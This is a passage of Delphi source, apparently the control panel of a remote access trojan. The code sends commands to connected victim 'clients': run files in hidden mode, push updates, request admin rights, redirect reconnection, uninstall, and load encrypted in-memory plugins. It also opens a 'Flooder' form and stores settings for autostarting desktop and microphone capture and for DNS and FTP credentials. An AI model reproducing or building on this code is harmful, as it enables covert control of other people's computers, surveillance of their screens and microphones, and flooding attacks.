      TmpItem := lvLogs.Items.Add;
      TmpItem.Caption := TmpList1[2];
      TmpItem.SubItems.Add(TmpList1[3]);
      if TmpList1[0] = ' -1' then TmpItem.ImageIndex := -1 else
        TmpItem.ImageIndex := StrToInt(Trim(TmpList1[0]));
      TmpItem.Data := Pointer(StrToInt(TmpList1[1]));
      SendMessage(lvLogs.Handle, WM_VSCROLL, SB_LINEDOWN, 0);
    end;

    lvLogs.Items.EndUpdate;
    Inc(j);
    if j >= 30 then Break;
  end;

  TmpList.Free;
end;

procedure TFormMain.SaveLogsDatas;
var
  TmpStr, TmpStr1: string;
begin
  if (SaveLogs = True) and (lvLogs.Items.Count > 0) then
  begin
    TmpStr := ExtractFilePath(ParamStr(0)) + 'Logs';
    if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
    TmpStr := TmpStr + '\' + MyGetDate('-');
    if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
    TmpStr := TmpStr + '\' + IntToStr(GetTickCount) + '.log';
    TmpStr1 := RetrieveLogs;
    if TmpStr1 <> '' then
    begin
      TmpStr1 := EnDecryptText(TmpStr1, PROGRAMPASSWORD);
      MyCreateFile(TmpStr, TmpStr1, Length(TmpStr1));
    end;
  end;
end;

procedure TFormMain.btn11Click(Sender: TObject);
begin
  pnlPlugins.BringToFront;
  if btn11.Tag = 1 then Exit else
  begin
    R2Click(Sender);
    btn11.Tag := 1;
  end;
end;

procedure TFormMain.btn8Click(Sender: TObject);
begin
  pnlDB.BringToFront;
  if btn8.Tag = 1 then Exit else
  begin
    LoadDBFile;
    btn8.Tag := 1;
  end;
end;

procedure TFormMain.I1Click(Sender: TObject);
var
  TmpStr: string;
  Module: PBTMemoryModule;
  PluginInfos: function(): PChar;
  p: Pointer;
  BufferSize: Int64;
  TmpList: TStringArray;
  TmpNode: PVirtualNode;
  ClientDatas: TClientDatas;
  TmpBool: Boolean;
begin
  dlgOpen1.InitialDir := PluginsPath;
  dlgOpen1.Filter := 'Plugin file (*.plugin)|*.plugin';
  dlgOpen1.DefaultExt := 'plugin';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpStr := FileToStr(dlgOpen1.FileName);
  BufferSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  Delete(TmpStr, 1, BufferSize);
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  
  if TmpStr = '' then
  begin
    MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  p := @TmpStr[1];
  TmpBool := True;

  try
    Module := BTMemoryLoadLibary(p, Length(TmpStr));
    if Module = nil then
    begin
      MessageBox(Handle, 'Failed to load plugin.', PROGRAMINFOS, MB_ICONERROR);
      TmpBool := False;
      Exit;
    end;

    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if not Assigned(PluginInfos) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR); 
      TmpBool := False;
      Exit;
    end;

    TmpStr := PluginInfos;
    if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR); 
      TmpBool := False;
      Exit;
    end;

    TmpList := ParseString('|', TmpStr);
    if TmpList[4] <> 'Client' then
    begin
      MessageBox(Handle, 'Only plugins of type Client are allowed.', PROGRAMINFOS, MB_ICONERROR);
      TmpBool := False;
      Exit;
    end;
  finally
    BTMemoryFreeLibrary(Module);
  end;

  if TmpBool = False then Exit;
  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CUSTOMPLUGININSTALL + '|' + dlgOpen1.FileName + '|' +
      IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
    TmpNode := vrtlstrngtr1.GetNext(TmpNode);
  end;
end;

procedure TFormMain.S2Click(Sender: TObject);
begin
  if ClientsList.Count = 0 then
  begin
    MessageBox(Handle, 'No clients connected.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  FormFlooder.Show;
end;

procedure TFormMain.U1Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin                
  if ClientsList.Count = 0 then Exit;
  
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'Client file (*.exe)|*.exe';
  dlgOpen1.DefaultExt := 'exe';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUPDATEFROMLOCAL + '|' + dlgOpen1.FileName + '|' +
      IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
  end;
end;

procedure TFormMain.D5Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpBool: Boolean;
  i: Integer;                                             
begin                        
  if ClientsList.Count = 0 then Exit;
  
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := '(*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  case MessageBox(Handle, 'Do you want to execute file in hidden mode?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) of
    IDYES: TmpBool := True;
    IDNO: TmpBool := False;
    IDCANCEL: Exit;
  end;
    
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;

    if TmpBool then
    begin
      ClientDatas.SendDatas(FILESEXECUTEFROMLOCAL + '|' + dlgOpen1.FileName + '|Y|' +
        IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
    end
    else
    begin
      ClientDatas.SendDatas(FILESEXECUTEFROMLOCAL + '|' + dlgOpen1.FileName + '|N|' +
        IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
    end;
  end;
end;

procedure TFormMain.R7Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
  TmpStr: string;
begin         
  if ClientsList.Count = 0 then Exit;

  TmpStr := '127.0.0.1:80';
  if not InputQuery('Reconnect to host', 'Host address', TmpStr) then Exit;
  if (TmpStr = '') or (Pos(':', TmpStr) <= 0) then Exit;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTRECONNECT + '|' + TmpStr);
  end;
end;

procedure TFormMain.U5Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin                    
  if ClientsList.Count = 0 then Exit;
  
  if MessageBox(Handle, PChar('Are you sure you want to uninstall all connected clients?'),
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTUNINSTALL + '|');
  end;
end;

procedure TFormMain.C10Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin                   
  if ClientsList.Count = 0 then Exit;
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(CLIENTCLOSE + '|');
  end;
end;

procedure TFormMain.I2Click(Sender: TObject);
var
  TmpStr: string;
  Module: PBTMemoryModule;
  PluginInfos: function(): PChar;
  p: Pointer;
  BufferSize: Int64;
  TmpList: TStringArray;
  ClientDatas: TClientDatas;
  i: Integer;
begin                
  if ClientsList.Count = 0 then Exit;
  
  dlgOpen1.InitialDir := PluginsPath;
  dlgOpen1.Filter := 'Plugin file (*.plugin)|*.plugin';
  dlgOpen1.DefaultExt := 'plugin';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpStr := FileToStr(dlgOpen1.FileName);
  BufferSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
  Delete(TmpStr, 1, Pos('|', TmpStr));
  Delete(TmpStr, 1, BufferSize);
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  
  if TmpStr = '' then
  begin
    MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  p := @TmpStr[1];

  try
    Module := BTMemoryLoadLibary(p, Length(TmpStr));
    if Module = nil then
    begin
      MessageBox(Handle, 'Failed to load plugin.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
    if not Assigned(PluginInfos) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    TmpStr := PluginInfos;
    if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then
    begin
      MessageBox(Handle, 'Invalid plugin datas.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    TmpList := ParseString('|', TmpStr);
    if TmpList[4] <> 'Client' then
    begin
      MessageBox(Handle, 'Only plugins of type Client are allowed.', PROGRAMINFOS, MB_ICONERROR);
      Exit;
    end;

    for i := 0 to ClientsList.Count - 1 do
    begin
      Application.ProcessMessages;
      ClientDatas := TClientDatas(ClientsList[i]);
      if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
      ClientDatas.SendDatas(CUSTOMPLUGININSTALL + '|' + dlgOpen1.FileName + '|' +
        IntToStr(MyGetFileSize(dlgOpen1.FileName)) + #0);
    end;
  finally
    BTMemoryFreeLibrary(Module);
  end;
end;

procedure TFormMain.SavePluginsInfos;
var
  TmpStr, TmpStr1: string;
  i: Integer;
begin
  for i := 0 to FormPluginsManager.lv1.Items.Count - 1 do
  if FormPluginsManager.lv1.Items.Item[i].Caption <> '' then
  TmpStr := TmpStr + FormPluginsManager.lv1.Items.Item[i].Caption + '?' +
    FormPluginsManager.lv1.Items.Item[i].SubItems[0] + '|';

  TmpStr1 := ExtractFilePath(ParamStr(0)) + 'Settings\Plugins.settings';
  if FileExists(TmpStr1) then DeleteFile(TmpStr1);

  if TmpStr = '' then Exit;
  TmpStr := EnDecryptText(TmpStr, PROGRAMPASSWORD);
  MyCreateFile(TmpStr1, TmpStr, Length(TmpStr));
end;

procedure TFormMain.R8Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpNode: PVirtualNode;
begin
  if vrtlstrngtr1.SelectedCount = 0 then Exit;
  
  if MessageBox(Handle, 'This action require client restart, do you want to continue?',
    PROGRAMINFOS, MB_ICONQUESTION + MB_YESNOCANCEL) <> IDYES
  then Exit;

  TmpNode := vrtlstrngtr1.GetFirstSelected;
  while Assigned(TmpNode) do
  begin
    Application.ProcessMessages;
    if TmpNode.ChildCount > 0 then Continue;
    ClientDatas := TClientDatas(PClientDatas(vrtlstrngtr1.GetNodeData(TmpNode)^));
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    ClientDatas.SendDatas(REQUESTADMIN + '|');
    TmpNode := vrtlstrngtr1.GetNextSelected(TmpNode);
  end;
end;

procedure TFormMain.MenuItem1Click(Sender: TObject);
var
  TmpItem: TListItem;
  Bmp, Bmp1: TBitmap;
begin
  if not Assigned(lvPlugins.Selected) then Exit;
  if lvPlugins.Selected.SubItems[5] = 'Installed' then Exit;

  TmpItem := FormPluginsManager.lv1.Items.Add;
  TmpItem.Caption := lvPlugins.Selected.Caption;
  TmpItem.SubItems.Add(lvPlugins.Selected.SubItems[4]);

  Bmp := TBitmap.Create;
  il1.GetBitmap(0, Bmp);

  Bmp1 := TBitmap.Create;
  il3.GetBitmap(lvPlugins.Selected.Index, Bmp1);
  Bmp1.Canvas.Draw(0, 0, Bmp);
  il3.Replace(lvPlugins.Selected.Index, Bmp1, nil);
  Bmp.Free;
  Bmp1.Free;

  lvPlugins.Selected.SubItems[5] := 'Installed';
end;

procedure TFormMain.U6Click(Sender: TObject);
var
  Bmp: TBitmap;
  i: Integer;
begin
  if not Assigned(lvPlugins.Selected) then Exit;
  if lvPlugins.Selected.SubItems[5] = 'Not installed' then Exit;

  for i := FormPluginsManager.lv1.Items.Count - 1 downto 0 do
  begin
    if FormPluginsManager.lv1.Items.Item[i].Caption = lvPlugins.Selected.Caption then
    FormPluginsManager.lv1.Items.Item[i].Delete;
  end;

  if lvPlugins.Selected.Data <> nil then
  begin
    Bmp := TBitmap.Create;
    ThumbsList.GetBitmap(TMyThumbList(lvPlugins.Selected.Data).Thumb, Bmp);
    il3.Replace(lvPlugins.Selected.Index, Bmp, nil);
    Bmp.Free;
  end;

  lvPlugins.Selected.SubItems[5] := 'Not installed';
end;

procedure TFormMain.lvPluginsContextPopup(Sender: TObject;
  MousePos: TPoint; var Handled: Boolean);
var
  i: Integer;
begin
  if not Assigned(lvPlugins.Selected) then
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := False;
    pm2.Items[0].Enabled := True;
  end
  else
  begin
    for i := 0 to pm2.Items.Count - 1 do pm2.Items[i].Enabled := True;

    if lvPlugins.Selected.SubItems[5] = 'Installed' then
    begin
      pm2.Items[3].Enabled := True;
      pm2.Items[2].Enabled := False;
    end
    else
    begin
      pm2.Items[2].Enabled := True;
      pm2.Items[3].Enabled := False;
    end;
  end;
end;

procedure TFormMain.T2Click(Sender: TObject);
begin
  if ClientsList.Count = 0 then
  begin
    MessageBox(Handle, 'No clients connected.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  FormClientsTasks.Show;
end;

procedure TFormMain.tmr3Timer(Sender: TObject);
var
  ClientDatas: TClientDatas;
  i: Integer;
begin
  if ClientsList.Count = 0 then Exit;
  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    FormClientsTasks.CheckTask(ClientDatas, DateTimeToStr(Now), True, False);
  end;
end;

procedure TFormMain.btn12Click(Sender: TObject);
begin
  pnlStats.BringToFront;
  if btn12.Tag = 1 then Exit else
  begin
    LoadDBStatsFile;
    btn12.Tag := 1;                                                 
  end;

  if rb3.Checked then rb3.Checked := False;
end;

procedure TFormMain.rb1Click(Sender: TObject);
var
  i, j: Integer;
begin
  if lv2.Items.Count = 0 then Exit;

  lv2.Visible := True;
  lv2.BringToFront;
  cht1.Series[0].Clear;

  for i := 0 to lv2.Items.Count - 1 do
  begin
    Randomize;
    j := StrToInt(lv2.Items.Item[i].SubItems[0]);
    cht1.Series[0].Add(j, lv2.Items.Item[i].Caption, Random(1000000));
  end;
end;

procedure TFormMain.rb2Click(Sender: TObject);
var
  i, j: Integer;
begin
  if lv3.Items.Count = 0 then Exit;

  lv3.Visible := True;
  lv3.BringToFront;
  cht1.Series[0].Clear;

  for i := 0 to lv3.Items.Count - 1 do
  begin
    Randomize;
    j := StrToInt(lv3.Items.Item[i].SubItems[0]);
    cht1.Series[0].Add(j, lv3.Items.Item[i].Caption, Random(1000000));
  end;
end;

procedure TFormMain.tmr4Timer(Sender: TObject);
begin
  lbl6.Caption := 'Server uptime: ' + MSecToTime(GetTickCount - StartTime);
  if lv2.Items.Count > 0 then Series1.Rotate(5);
  if lv5.Items.Count > 0 then PieSeries1.Rotate(5);
  Application.ProcessMessages;
end;

procedure TFormMain.rb4Click(Sender: TObject);
var
  i, j: Integer;
begin
  if lv5.Items.Count = 0 then Exit;

  lv5.Visible := True;
  lv5.BringToFront;
  cht2.Series[0].Clear;

  for i := 0 to lv5.Items.Count - 1 do
  begin                                          
    Randomize;
    j := StrToInt(lv5.Items.Item[i].SubItems[0]);
    cht2.Series[0].Add(j, lv5.Items.Item[i].Caption, Random(1000000));
  end;
end;

procedure TFormMain.rb3Click(Sender: TObject);
var
  i, j: Integer;
begin
  if lv4.Items.Count = 0 then Exit;

  lv4.Visible := True;
  lv4.BringToFront;
  cht2.Series[0].Clear;

  for i := 0 to lv4.Items.Count - 1 do
  begin                                       
    Randomize;
    j := StrToInt(lv4.Items.Item[i].SubItems[0]);
    cht2.Series[0].Add(j, lv4.Items.Item[i].Caption, Random(1000000));
  end;
end;

procedure TFormMain.lbl14Click(Sender: TObject);
begin
  cht2.Series[0].Clear;
  lv4.Visible := False;
  lv5.Visible := False;
  if rb3.Checked then rb3.Checked := False;    
  if rb4.Checked then rb4.Checked := False;
  lbl8.Caption := 'Total clients connected: 0';   
  DeleteFile(DBStatsFile);
end;

procedure TFormMain.S6Click(Sender: TObject);
var
  JSONConfig: TJSONConfig;
begin
  Application.CreateForm(TFormSettings, FormSettings);

  with FormSettings do
  begin
    chkStartup.Checked := StartupListening;
    chkGeoip.Checked := GeoIpLocalisation;
    chkSound.Checked := SoundNotification;
    chkVisual.Checked := VisualNotification;
    chkMinimizeToTray.Checked := MinimizeToTray;
    chkCloseToTray.Checked := CloseToTray;
    chkLogs.Checked := SaveLogs;
    chkDesktop.Checked := AutostartDesk;
    chkMicrophone.Checked := AutoStartMic;
    seWidth.Value := ThumbWidth;
    seHeight.Value := ThumbHeight;
    chkPing.Checked := UpdateInfos;
    chkKAlive.Checked := KeepAlive;
    seTimeout.Value := TimeOut;
    cbbSkin.ItemIndex := SkinId;
    chkSkin.Checked := SkinForm;
    //
    seWidth.Enabled := not T1.Checked;
    seHeight.Enabled := not T1.Checked;
  end;

  if FormSettings.ShowModal <> mrOK then
  begin
    FormSettings.Release;
    FormSettings := nil;
    Exit;
  end;
  
  with FormSettings do
  begin
    StartupListening := chkStartup.Checked;
    GeoIpLocalisation := chkGeoip.Checked;
    SoundNotification := chkSound.Checked;
    VisualNotification := chkVisual.Checked;
    MinimizeToTray := chkMinimizeToTray.Checked;
    CloseToTray := chkCloseToTray.Checked;
    SaveLogs := chkLogs.Checked;
    ThumbWidth := seWidth.Value;
    ThumbHeight := seHeight.Value;
    AutostartDesk := chkDesktop.Checked;
    AutostartMic := chkMicrophone.Checked;
    UpdateInfos := chkPing.Checked;
    KeepAlive := chkKAlive.Checked;
    TimeOut := seTimeout.Value;
    SkinForm := chkSkin.Checked;
    SkinId := cbbSkin.ItemIndex;
  end;

  FormSettings.Release;
  FormSettings := nil;

  if not KeepAlive then tmr2.Enabled := False else tmr2.Enabled := True;

  JSONConfig := TJSONConfig.Create(SettingsFile, PROGRAMPASSWORD);
  JSONConfig.WriteBool('Startup listening', StartupListening);
  JSONConfig.WriteBool('GeoIp localisation', GeoIpLocalisation);
  JSONConfig.WriteBool('Sound notification', SoundNotification);
  JSONConfig.WriteBool('Visual notification', VisualNotification);
  JSONConfig.WriteBool('Minimize to system tray', MinimizeToTray);
  JSONConfig.WriteBool('Close to system tray', CloseToTray);
  JSONConfig.WriteBool('Save events logs', SaveLogs);
  JSONConfig.WriteBool('Autostart desktop capture', AutostartDesk);
  JSONConfig.WriteBool('Autostart microphone capture', AutostartMic);
  JSONConfig.WriteBool('Update infos', UpdateInfos);
  JSONConfig.WriteBool('Keep alive', KeepAlive);
  JSONConfig.WriteInteger('Thumbnail width', ThumbWidth);
  JSONConfig.WriteInteger('Thumbnail height', ThumbHeight);
  JSONConfig.WriteInteger('Keep alive timeout', TimeOut);
  JSONConfig.WriteBool('Enable skin', SkinForm);
  JSONConfig.WriteInteger('Skin id', SkinId);
  JSONConfig.WriteString('DNS host', DNSHost);
  JSONConfig.WriteString('DNS user', DNSUser);
  JSONConfig.WriteString('DNS pass', DNSPassword);
  JSONConfig.WriteInteger('DNS provider', DNSProvider);
  JSONConfig.WriteString('Ftp host', FtpHost);
  JSONConfig.WriteString('Ftp user', FtpUser);
  JSONConfig.WriteString('Ftp pass', FtpPass);
  JSONConfig.WriteString('Ftp directory', FtpDir);
  JSONConfig.WriteInteger('Ftp port', FtpPort);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormMain.L3Click(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  with FormSelectPort do
  begin
    se2.Value := MaxConnections;
    edt1.Text := ConnectionPassword;
  end;

  if FormSelectPort.ShowModal <> mrOK then Exit;

  with FormSelectPort do
  begin
    ActivePortList := '';
    if lv1.Items.Count > 0 then
    for i := 0 to lv1.Items.Count - 1 do
    ActivePortList := ActivePortList + lv1.Items.Item[i].Caption + '|';
    
    MaxConnections := se2.Value;
    ConnectionPassword := edt1.Text;
  end;
  
  JSONConfig := TJSONConfig.Create(PortsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteString('Active ports list', ActivePortList);
  JSONConfig.WriteString('Connection password', ConnectionPassword);
  JSONConfig.WriteInteger('Max connections', MaxConnections);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormMain.M2Click(Sender: TObject);
var
  ClientDatas: TClientDatas;
  TmpForm: TFormManager;
  i: Integer;
begin
  if ClientsList.Count = 0 then
  begin
    MessageBox(Handle, 'No clients connected.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  for i := 0 to ClientsList.Count - 1 do
  begin
    Application.ProcessMessages;
    ClientDatas := TClientDatas(ClientsList[i]);
    if (ClientDatas = nil) or (ClientDatas.Node.ChildCount > 0) then Continue;
    if ClientDatas.Forms[16] <> nil then TFormManager(ClientDatas.Forms[16]).Show else
    begin
      TmpForm := TFormManager.Create(Self, ClientDatas);
      ClientDatas.Forms[16] := TmpForm;
      TmpForm.Caption := 'Manager [' + ClientDatas.UserId + ']';
      TmpForm.Show;
    end;
  end;
end;

procedure TFormMain.R2Click(Sender: TObject);      
var
  SchRec: TSearchRec;
  Module: PBTMemoryModule;
  TmpList: TStringArray;
  TmpItem: TListItem;
  Buffer, TmpStr, TmpStr1: string;
  p: Pointer;
  PluginInfos: function(): PChar;
  BufferSize: Int64;
  jpg: TJPEGImage;
  Bmp, Bmp1, Bmp2: TBitmap;
  Stream: TMemoryStream;
  i, j: Integer;
  MyThumbList: TMyThumbList;
  TmpBool: Boolean;
begin
  if not DirectoryExists(PluginsPath) then CreateDir(PluginsPath);
  if FindFirst(PluginsPath + '\*.plugin', faAnyFile, SchRec) <> 0 then Exit;
  repeat
    Application.ProcessMessages;
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;

    for i := 0 to lvPlugins.Items.Count -1 do
    begin
      if lvPlugins.Items.Item[i].Caption = PluginsPath + '\' + SchRec.Name then TmpBool := True;
      Break;
    end;

    if TmpBool then Continue;

    Buffer := FileToStr(PluginsPath + '\' + SchRec.Name);
    BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
    Delete(Buffer, 1, Pos('|', Buffer));
    TmpStr1 := Copy(Buffer, 1, BufferSize);
    Delete(Buffer, 1, BufferSize);
    Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);

    if Buffer = '' then Continue;
    p := @Buffer[1];

    try
      Module := BTMemoryLoadLibary(p, Length(Buffer));
      if Module = nil then Continue;

      @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
      if not Assigned(PluginInfos) then Continue;

      TmpStr := PluginInfos();
      if (TmpStr = '') or (Pos('|', TmpStr) <= 0) then Continue;

      TmpList := ParseString('|', TmpStr);
      if TmpList[4] = 'Client' then Continue;

      lvPlugins.Items.BeginUpdate;

      TmpItem := lvPlugins.Items.Add;
      TmpItem.Caption := PluginsPath + '\' + SchRec.Name;
      TmpItem.SubItems.Add(TmpList[0]);
      TmpItem.SubItems.Add(TmpList[1]);
      TmpItem.SubItems.Add(TmpList[2]);
      TmpItem.SubItems.Add(TmpList[3]);
      TmpItem.SubItems.Add(TmpList[4]);
      TmpItem.SubItems.Add('Not installed');

      Stream := TMemoryStream.Create;
      Stream.Write(Pointer(TmpStr1)^, Length(TmpStr1));
      Stream.Position := 0;

      try
        Jpg := TJPEGImage.Create;
        Jpg.LoadFromStream(Stream);
        Stream.Free;
        Bmp := TBitmap.Create;
        Bmp.Width := Jpg.Width;
        Bmp.Height := Jpg.Height;
        Bmp.Canvas.Draw(0, 0, Jpg);
        Jpg.Free;
      except
        Stream.Free;
        Jpg.Free;
        Bmp.Free;
        Continue;
      end;

      TmpItem.ImageIndex := il3.Add(Bmp, nil);
      MyThumbList := TMyThumbList.Create;
      MyThumbList.Thumb := ThumbsList.Add(Bmp, nil);
      TmpItem.Data := MyThumbList;
      Bmp.Free;

      lvPlugins.Items.EndUpdate;
    finally
      BTMemoryFreeLibrary(Module);
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);

  for j := 0 to lvPlugins.Items.Count -1 do
  begin
    Application.ProcessMessages;
    for i := 0 to FormPluginsManager.lv1.Items.Count -1 do
    begin
      Application.ProcessMessages;
      if FormPluginsManager.lv1.Items.Item[i].Caption = lvPlugins.Items.Item[j].Caption then
      begin
        lvPlugins.Items.Item[j].SubItems[5] := 'Installed';

        Bmp1 := TBitmap.Create;
        il1.GetBitmap(0, Bmp1);

        Bmp2 := TBitmap.Create;
        il3.GetBitmap(lvPlugins.Items.Item[j].Index, Bmp2);
        Bmp2.Canvas.Draw(0, 0, Bmp1);
        il3.Replace(lvPlugins.Items.Item[j].Index, Bmp2, nil);
        Bmp1.Free;
        Bmp2.Free;
      end;
    end;
  end;
end;

end.


